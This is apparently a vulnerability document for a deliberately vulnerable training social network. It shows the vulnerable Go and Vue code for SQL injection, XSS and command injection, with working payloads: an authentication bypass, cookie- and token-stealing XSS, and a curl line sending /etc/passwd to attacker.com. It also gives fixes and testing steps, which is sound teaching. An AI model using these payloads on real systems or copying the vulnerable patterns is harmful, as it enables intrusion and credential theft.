# ca-ssg/vuln-sns Vulnerability Details

## SQL Injection Vulnerabilities

### Login SQL Injection
- **File**: `backend/internal/handlers/auth.go`
- **Function**: `Login()`
- **Vulnerable Code**:
```go
query := fmt.Sprintf("SELECT id, nickname, avatar_data FROM users WHERE id = '%s' AND password = SHA2('%s', 256)",
    credentials.UserID, credentials.Password)
```
- **Attack Payloads**:
  - `' OR '1'='1' --` (authentication bypass)
  - `alice' --` (specific user bypass)
- **Impact**: Authentication bypass, data extraction

### Post Operations SQL Injection
- **File**: `backend/internal/handlers/post.go`
- **Functions**: `CreatePost()`, `UpdatePost()`, `DeletePost()`
- **Vulnerable Code Examples**:
```go
// CreatePost
query := fmt.Sprintf("INSERT INTO posts (user_id, content) VALUES ('%s', '%s')", userID, post.Content)

// UpdatePost  
query := fmt.Sprintf("UPDATE posts SET content = '%s' WHERE id = %s AND user_id = '%s'", post.Content, postID, userID)

// DeletePost
query := fmt.Sprintf("DELETE FROM posts WHERE id = %s AND user_id = '%s'", postID, userID)
```
- **Impact**: Data manipulation, information disclosure

## Cross-Site Scripting (XSS)

### Post Content XSS
- **File**: `frontend/src/components/PostCard.vue`
- **Vulnerable Code**:
```vue
<div class="q-mt-sm" v-html="post.content" @click="handleHashtagClick"></div>
```
- **Attack Payloads**:
  - `<img src=x onerror="alert(1)">`
  - `<svg onload=alert(document.cookie)>`
  - `<img src=x onerror=alert(localStorage.getItem("token"))>`
- **Impact**: Session hijacking, malicious script execution

## OS Command Injection

### Avatar Upload Command Injection
- **File**: `backend/internal/handlers/profile.go`
- **Function**: `scanFile()`
- **Vulnerable Code**:
```go
cmd := exec.Command("sh", "-c", "echo 'Scanning file: ' && echo "+fileID)
```
- **Attack Payloads**:
  - `avatar.jpg && cat /etc/passwd`
  - `avatar.jpg; ls -la /`
  - `avatar.jpg | curl -X POST -d @/etc/passwd https://attacker.com/`
- **Attack Method**:
```bash
curl 'http://localhost:9090/api/profile/avatar' \
  -H 'Authorization: Bearer alice_token' \
  -H 'Content-Type: application/json' \
  --data-raw '{
    "file_id":"avatar.jpg && cat /etc/passwd",
    "image_data":"R0lGODlhAQABAIAAAP///////yH+BnBzYV9zbAAh+QQBCgABACwAAAAAAQABAAACAkwBADs="
  }'
```
- **Impact**: Remote code execution, system compromise

## Authentication Weaknesses

### Weak Token Generation
- **File**: `backend/internal/handlers/auth.go`
- **Vulnerable Code**:
```go
c.JSON(http.StatusOK, gin.H{
    "token": user.ID + "_token",
    "user":  user,
})
```
- **Issue**: Predictable token format
- **Impact**: Token prediction, session hijacking

### Password Logging
- **Files**: Various handler files
- **Issue**: Passwords may appear in application logs
- **Impact**: Information disclosure

## Secure Code Examples

### SQL Injection Prevention
```go
// Use prepared statements
stmt, err := h.db.Prepare("SELECT id, nickname FROM users WHERE id = ? AND password = SHA2(?, 256)")
err := stmt.QueryRow(credentials.ID, credentials.Password).Scan(&user.ID, &user.Nickname)
```

### XSS Prevention
```vue
<!-- Use v-text instead of v-html -->
<div class="q-mt-sm" v-text="post.content"></div>
```

### Command Injection Prevention
```go
// Avoid shell execution, use direct command execution
cmd := exec.Command("grep", "-q", "virus_signature", filePath)
// Or use safe file operations without external commands
```

## Testing Methodology

### SQL Injection Testing
1. Intercept login requests
2. Modify user_id parameter with SQL payloads
3. Observe authentication bypass or error messages
4. Test post creation/update with SQL payloads

### XSS Testing
1. Create posts with HTML/JavaScript payloads
2. View posts to trigger XSS
3. Check for script execution in browser console
4. Test cookie/token extraction

### Command Injection Testing
1. Upload avatar with malicious file_id
2. Check malware_scan field in response
3. Look for command output in API response
4. Test various command injection techniques

## Remediation Priority
1. **High**: SQL Injection (authentication bypass)
2. **High**: OS Command Injection (RCE)
3. **Medium**: XSS (session hijacking)
4. **Low**: Weak token generation
5. **Low**: Password logging
